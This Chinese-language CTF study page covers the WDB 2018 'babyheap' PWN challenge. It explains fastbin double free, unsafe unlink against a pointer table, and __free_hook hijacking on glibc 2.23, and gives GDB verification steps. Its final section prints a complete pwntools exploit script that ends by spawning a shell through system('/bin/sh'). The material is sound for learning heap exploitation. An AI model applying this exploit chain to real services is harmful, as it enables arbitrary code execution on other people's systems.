# 知识点

Heap

# 题目分析

分类：PWN / Heap。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [ORIGINAL_NOTES.md](ORIGINAL_NOTES.md)
- [babyheap](babyheap)
- [exp.py](exp.py)
- [exp_old.py](exp_old.py)
- [ld-2.23.so](ld-2.23.so)
- [ld-linux-x86-64.so.2](ld-linux-x86-64.so.2)
- [libc-2.23.so](libc-2.23.so)
- [libc.so.6](libc.so.6)

## 已有分析

- [ORIGINAL_NOTES.md](ORIGINAL_NOTES.md)
- [wdb_2018_1st_babyheap_WP_学习版.md](notes/wdb_2018_1st_babyheap_WP_%E5%AD%A6%E4%B9%A0%E7%89%88.md)


### WDB_2018_1st_babyheap：Fastbin 与 Unsafe Unlink 学习版

> [!warning] 证据边界
> 本页根据用户提供的路线整理，不等于已在附件上跑通。`glibc 2.23`、全局指针表 `0x602060`、`main_arena + 0x58`、菜单编号和每个 chunk 的地址，都必须以**当前题目 ELF、题给 libc 与 GDB 现场**复核。下面的地址和操作顺序只能作为“需要验证的假设”。

#### 一句话

这题的学习重点不是背一长串 `add/delete/edit`，而是把一条链拆开：

```text
UAF / 重复释放候选
    → fastbin 链控制候选
    → 伪造相邻 chunk 元数据
    → 触发带检查的 unlink，改写指针表
    → 取得受限读写 / libc 泄露
    → 旧版 libc 中再考虑 __free_hook
```

每一个箭头都要先在 GDB 看到对应的堆状态；前一步不成立，后面的 hook、`system` 都没有意义。

> [!abstract] 推荐阅读顺序
> 1. 先读「两种地址」，把 **header 地址** 与 **用户指针**分清。
> 2. 再读「每一段在解决什么」，只记每一步拿到的原语。
> 3. 然后看「GDB 验收点」，拿真实附件逐格验证。
> 4. 最后才看公开 WP 或尝试写脚本。
>
> 这页不要求你现在记住 `0x602060`、`0x3c4b78` 或某个 `heap - 0x20`；它们都不是跨题公式。
>
> [!question] 本题先回答的三个问题
> - `delete` 之后，旧的 `ptr[i]` 还能不能访问？
> - fastbin 的 `fd` 里实际放的是哪一种地址？
> - `delete(1)` 真的走到了 unlink 的合并分支吗？

#### 1. 题目画像：程序到底保存了什么

用户提供的伪代码可先抽象为：

```c
char *ptr[...];                 // 固定地址、大小和类型都待 ELF 验证

void add(int i)    { ptr[i] = malloc(0x20); }
void edit(int i)   { read(0, ptr[i], 0x20); }
void show(int i)   { puts(ptr[i]); }
void delete(int i) { free(ptr[i]); }  // 如果没有 ptr[i] = NULL，才有悬空指针
```

人话：程序把每次 `malloc` 返回的地址放在 `ptr[i]`。若 `delete(i)` 只释放、不清空这个槽，`show/edit/delete` 还可能继续通过旧地址访问已经释放或被复用的 chunk。

##### 开始前核对清单

| 要确认的事实 | 为什么不能省略 | 最小确认方式 |
|---|---|---|
| 架构、PIE、RELRO、NX | 决定地址是否固定、目标表能否直接使用 | `file`、`checksec` |
| 实际 loader / libc | fastbin 检查、`main_arena` 偏移和 hook 是否可用都随版本变 | `info proc mappings`、`info sharedlibrary` |
| `delete` 是否清空 `ptr[i]` | 不清空才产生该路线需要的 UAF / double-free 候选 | IDA 伪代码 + delete 后 `x/gx ptr+i*8` |
| `edit` 的真实长度 | 是否刚好能写满对象、越到 metadata，完全取决于它 | IDA / `disassemble` / 断在 `read` |
| 指针表的位置 | `0x602060` 只属于某一个非 PIE 编译样本 | `ELF.sym`、IDA `.bss`、GDB `x/8gx` |

#### 2. 先过这一关：header 地址和用户指针

64 位 glibc 中要区分：

```text
chunk header 地址 H                 malloc 返回给程序的用户指针 U
┌──────────────────────┐            ┌──────────────────────┐
│ prev_size  (8 bytes) │ H          │ 用户数据             │ U = H + 0x10
│ size       (8 bytes) │            │                      │
└──────────────────────┘            └──────────────────────┘
```

> [!important] Fastbin 的 `fd`
> 在经典 glibc fastbin 实现里，空闲 chunk 的 `fd` 语义是下一个 **chunk header 指针**（`mchunkptr`）；下一次 `malloc` 返回时会把 header 转成用户指针，64 位通常是 `H + 0x10`。公开 WP 常把“链表节点”直接叫 chunk 地址，容易把 header 地址和用户地址混掉。不要只看 Python 中的 `heap - 0x20`：用 `x/4gx USER-0x10` 与 `fastbins` 同时确认，才能判断减法是否正确。

在 glibc 2.23 的 fastbin 场景下，用户区开头会被 allocator 临时拿来保存 `fd`：

```text
free 后：
U + 0x00  ── fd（逻辑上指向下一个空闲 chunk 的 header）
U + 0x08  ── 原用户内容的一部分 / allocator 可复用空间
```

这不是 Safe-Linking 的编码字段；Safe-Linking 是较新版本才加入的机制。`glibc版本差异` 用来判断版本，不可跨版本照搬。

> [!tip] 一眼判断是否混淆
> 如果 GDB 的 `fastbins` 显示一个地址为 `H`，而程序的 `ptr[i]` 为 `H+0x10`，两者并不矛盾：前者是 allocator 看到的 chunk，后者是程序可写的用户区。先把这两个值同时记到 Research Log。

#### 3. 利用链拆开看：每一步只解决一个问题

| 阶段 | 静态路线里的操作意图 | 成功时应有的原语 | 还不能直接推出什么 |
|---|---|---|---|
| 释放 `0 → 1 → 0` | 让同一 chunk 再次出现在旧 fastbin 链中 | UAF / 重复释放候选 | 不等于后续一定绕过 glibc 检查 |
| `show(0)` | 读取 free 后用户区里留下的链表指针 | 堆地址泄露候选 | 不等于 libc 泄露 |
| `edit(0, ...)` | 经旧指针改写空闲 chunk 的管理字段或伪造元数据 | 对 fastbin / metadata 的受限写候选 | 不等于任意地址写 |
| 申请 fake chunk | 让 `malloc` 返回到人为准备的数据附近 | 可控 chunk 内容或布局 | 不等于 unlink 已触发 |
| `delete(1)` | 试图走后向合并与 unlink 检查 | 对指针表的一次受限改写 | 不等于完整任意写 |
| `show(5)` | 通过被改写的表项读取 unsorted-bin 指针 | libc 泄露候选 | 偏移必须对应实际 libc |
| 改 hook 后 `delete(2)` | 在老 libc 中把 `free(p)` 引到 `system(p)` | 控制流触发候选 | `p` 必须确实指向 `/bin/sh` |

#### 4. 伪造区域为什么要反复出现

附件路线中会看到诸如 `flat(0, 0x21)`、`flat(0, 0x31, fd, bk)` 的数据。它们不是“神奇字符串”，而是在不同时间扮演不同角色：

```text
第一次：让 malloc / fastbin 把某片可控内存当成一个看起来合理的小 chunk
第二次：让相邻释放路径把这片区域当成可向前合并的空闲 chunk
第三次：让 unlink 检查从 fd / bk 找到可验证的双向关系
```

典型的伪造 unlink 结构是：

```text
fake chunk:
+0x00  prev_size
+0x08  size（必须和触发路径、相邻 chunk 的 P 位相容）
+0x10  fd = ptr_table - 0x18
+0x18  bk = ptr_table - 0x10

检查的目的：
FD->bk == P   且   BK->fd == P
```

于是 unlink 的两个写入会落回指针表附近。这是一个**受限的指针表改写**模型，不应笼统写成“unlink = 任意地址写”。详情先读 `Unlink详解`。

> [!example] 先用一句人话记住
> 这里伪造 `fd/bk` 的目的不是直接写 hook，而是先让 allocator 在检查通过后，替你改掉“程序管理 chunk 的指针表”。拿到更强的读写能力后，才有后续泄露与控制流讨论。

#### 5. 操作骨架：只作调试路线，不是可直接运行 EXP

下面保留用户提供路线的结构，刻意不填菜单函数、固定地址或 libc 偏移：原始 ELF、libc、交互提示和运行时地址都没有随附件提供。

```python
### 仅表示阶段，不能直接执行
### add(i, data) / edit(i, data) / show(i) / delete(i) 必须按当前题目实现。

### 1) 布局：为后续相邻 chunk / 字符串 / 伪 header 留位置
### add(0, b'A' * 0x20)
### add(1, b'B' * 8 + p64(0x21))
### add(2, b'/bin/sh\x00'.ljust(0x20, b'C'))

### 2) 候选重复释放：每一次 delete 后都要查看 fastbin，而不是盲目继续
### delete(0); delete(1); delete(0)
### heap_leak = leak_from_show(0)

### 3) 通过悬空引用尝试改 fastbin / 伪造 metadata
### edit(0, forged_bytes)

### 4) 申请并布置 fake chunk；在触发 delete(1) 前检查 P、size、fd、bk
### add(4, fake_chunk_with_fd_bk)
### delete(1)

### 5) 只有确认表项已按预期改写并得到真实 libc 指针，才计算 libc.address
### libc.address = leaked_symbol - verified_offset
```

> [!warning] 不要补成“看起来完整”的脚本
> 当前附件没有 `add/edit/show/delete` 的真实协议、原 ELF、题给 libc 或动态输出；把 `0x602060`、`0x3c4b78` 等常量拼成完整 EXP 会制造“能运行”的假象。先完成下一节的断点验收，再从当前样本提取参数。

#### 6. GDB 验收：每个阶段只看一个结果

先给变量起清晰名字；只有静态核实后才赋具体值：

```gdb
set $table = 0x602060         # 示例：必须由当前 ELF 确认
### $u0、$u1 等改成当前 malloc 返回的用户指针
```

| 停止位置 | 命令 | 要观察的现象 | 若不符合，先查什么 |
|---|---|---|---|
| 三次释放后 | `fastbins`、`x/4gx $u0-0x10` | 同尺寸 fastbin 链的顺序、`fd` 原始值 | 是否真是 glibc 2.23；free 是否被检查拦截 |
| `show(0)` 前 | `x/2gx $u0` | 输出是否来自 free 后用户区；泄露字节数是否够 | `puts` 是否被 NUL 截断；是否读错 index |
| 改写 `fd` 后 | `x/4gx $u0-0x10`、`fastbins` | raw `fd` 与你推导的 header 目标一致 | header/user 指针是否混淆；对齐/size 是否错误 |
| 触发 unlink 前 | `x/6gx $fake`、`x/8gx $table` | fake 的 size、fd、bk 与表项互相满足检查 | `prev_size`、P 位、相邻真实 chunk 的 size |
| `delete(1)` 后 | `x/8gx $table`、`bins` | 表项发生预期的**一次受限改写** | 是否实际走合并路径而非 fastbin 路径 |
| libc 泄露后 | `info proc mappings`、`p/x leak` | leak 落在加载 libc 映射内；减偏移后页对齐 | 泄露类型、实际 libc 文件与符号偏移 |
| hook 触发前 | `p/x &__free_hook`、`x/s $rdi` | 当前 libc 有效 hook；待 free 的指针真指向 `/bin/sh` | glibc 是否为 2.34+；参数/字符串是否正确 |

> [!success] 最小验收顺序
> 先只做到：三次释放后画对 fastbin 链 → 看懂一段 heap 泄露来自哪里 → 证明 fake chunk 的 `fd/bk` 通过检查。
> 在这三件事没有证据前，不进入 libc 偏移或 `__free_hook` 阶段。

#### 7. 常见失败：按因果排查

| 现象 | 常见原因 | 不要做什么 |
|---|---|---|
| 第二次释放直接 abort | 当前 libc 已有 double-free 检查，或 chunk 不在预期 bin | 不要换一个随机次数继续 free |
| `show` 没泄露 / 只输出乱码 | `puts` 被 `\x00` 截断，或该 index 已被复用 | 不要把不完整字节直接当 8 字节地址 |
| 申请没有落到 fake 区 | fastbin `fd` 的 header/user 语义混淆，size class 不同 | 不要硬改减法常数 |
| unlink 报 `corrupted double-linked list` | `FD->bk` / `BK->fd` 或相邻 size/P 位不满足 | 不要跳过 fake chunk 的逐 qword 检查 |
| libc base 不是页对齐 | 泄露不是预想字段、使用了错误版本的偏移 | 不要强行 `& ~0xfff` “修正”地址 |
| hook 写了却没有 shell | 新 libc 不使用 hook，或 `free` 的参数不是 `/bin/sh` | 不要把 `__free_hook=system` 当跨版本答案 |

#### 8. 回到哪篇知识点补前置

- `Fastbin_Attack`：先理解空闲链、大小类别与 `fd`。
- `Unlink详解`：理解双向链检查和“受限指针表改写”。
- `UAF详解`：确认 delete 后旧指针为何仍能读/写。
- `glibc版本差异`：判断 2.23 的历史路径与新版本差别。
- `__free_hook劫持`：只在老 libc 环境中理解 `free(p) → system(p)`；它不替代前面的读写原语。
- [how2heap glibc 2.23 unsafe_unlink 示例](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/unsafe_unlink.c)：只对照检查关系与实验注释，不照搬地址。

#### 9. 自测与下一步

先不看公开 WP，回答并用 GDB 证明：

1. `fastbin fd` 在当前运行时是 header 地址还是用户地址？你的证据是哪两条命令？
2. `delete(1)` 前，哪个真实 chunk 的哪个标志位决定是否向前合并？
3. `fd = table-0x18`、`bk = table-0x10` 分别服务于哪一条 unlink 检查？
4. 你读到一个泄露值时，如何证明它属于 libc，而不是 heap 或程序 `.bss`？

通过条件：留下一次真实的 `fastbins`、`x/4gx user-0x10`、fake chunk 与指针表前后对比、`info proc mappings` 输出；再做一次改变申请顺序的变式。完成前，本页保持 L1。


# EXP

- [exp.py](exp.py)
- [exp_old.py](exp_old.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。

```python
from pwn import *
context(os='linux', arch='amd64', log_level='info')
elf = ELF('./babyheap', checksec=False)
libc = ELF('./libc-2.23.so', checksec=False)
if args.REMOTE:
    io = remote('challenge.example.invalid', 9999)
else:
    io = process(['./ld-2.23.so', '--library-path', '.', './babyheap'])
def add(i, data):
    io.sendlineafter(b'Choice:', b'1')
    io.sendlineafter(b'Index:', str(i).encode())
    io.sendafter(b'Content:', data if len(data) == 0x20 else data + b'\n')
def edit(i, data):
    io.sendlineafter(b'Choice:', b'2')
    io.sendlineafter(b'Index:', str(i).encode())
    io.sendafter(b'Content:', data if len(data) == 0x20 else data + b'\n')
def show(i):
    io.sendlineafter(b'Choice:', b'3')
    io.sendlineafter(b'Index:', str(i).encode())
    return io.recvline(drop=True)
def delete(i):
    io.sendlineafter(b'Choice:', b'4')
    io.sendlineafter(b'Index:', str(i).encode())
def leak(data):
    return u64(data[:6].ljust(8, b'\x00'))
# 1. 初始化
add(0, b'a' * 0x20)
add(1, b'b' * 8 + p64(0x21))
add(2, b'/bin/sh\x00' + b'c' * 0x18)
add(3, flat(0, 0x31, 0, 0x31))
add(6, flat(0, 0x21))
# 2. Double Free + 泄露 Heap
delete(0)
delete(1)
delete(0)
heap = leak(show(0))
log.success(f'heap = {heap:#x}')
# 3. Fastbin Attack
edit(0, flat(heap - 0x20, 0x21, 0, 0x21))
ptr = 0x602060
add(4, flat(0, 0x31, ptr - 0x18, ptr - 0x10))
add(5, flat(ptr - 0x18, ptr - 0x10, 0x20, 0xa0))
# 4. Fake Chunk + Unlink
delete(0)
add(7, flat(0, 0x21, ptr - 0x18, ptr - 0x10))
delete(1)
# 5. 泄露 libc
libc.address = leak(show(5)) - 0x3c4b78
log.success(f'libc = {libc.address:#x}')
# 6. __free_hook = system
edit(0, b'a' * 0x18 + p64(libc.sym['__free_hook']))
edit(0, p64(libc.sym['system']))
# 7. system("/bin/sh")
delete(2)
io.interactive()
```
